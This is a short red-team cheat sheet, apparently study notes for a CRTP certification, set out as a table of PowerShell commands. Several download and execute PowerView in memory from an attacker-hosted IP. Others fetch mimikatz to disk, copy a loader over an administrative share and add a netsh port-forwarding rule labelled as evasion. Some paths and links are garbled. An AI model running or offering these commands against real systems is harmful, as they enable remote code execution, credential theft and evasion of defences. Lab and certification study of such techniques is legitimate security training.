---
title: "File Transfer using PowerShell"
date: 2025-03-27 10:06:00 +0000
categories: [Certifications Technical Notes, Certified Red Team Professional (CRTP)]
tags: [networking, offensive security]
---

| Method | Command | Description |
| --- | --- | --- |
| Modern Execution (PS 3.0+) | `iex (irm -Uri "[http://172.16.100.86/PowerView.ps1](http://172.16.100.86/PowerView.ps1)")` | Download and execute script in memory without saving to disk |
| WebClient Download & Execute | `iex ((New-Object Net.WebClient).DownloadString('[http://172.16.100.86/PowerView.ps1](http://172.16.100.86/PowerView.ps1)'))` | Use .NET WebClient to download and execute directly |
| Invoke-WebRequest Execute | `iex (iwr -Uri "[http://172.16.100.86/PowerView.ps1](http://172.16.100.86/PowerView.ps1)")` | Download and execute using Invoke-WebRequest alias |
| Download and Save (IWR) | `Invoke-WebRequest -Uri "[http://172.16.100.86/PowerView.ps1](http://172.16.100.86/PowerView.ps1)" -OutFile "C:[tempPowerView.ps](http://tempPowerView.ps)1"` | Download script and save to local file |
| Download and Save (WebClient) | `(New-Object [System.Net](http://System.Net).WebClient).DownloadFile("[http://172.16.100.1/mimikatz.exe](http://172.16.100.1/mimikatz.exe)", "C:/mimikatz.exe")` | Download executable and save to disk using WebClient |
| Copy Files via Session | `echo F | xcopy C:UsersPublicLoader.exe \dcorp-mgmtC$UsersPublicLoader.exe` | Copy files to remote machine using administrative share |
| Port Forwarding (Evasion) | `winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.86"` | Add port forwarding rule to redirect traffic (any:8080 â†’ 172.16.100.86:80) |
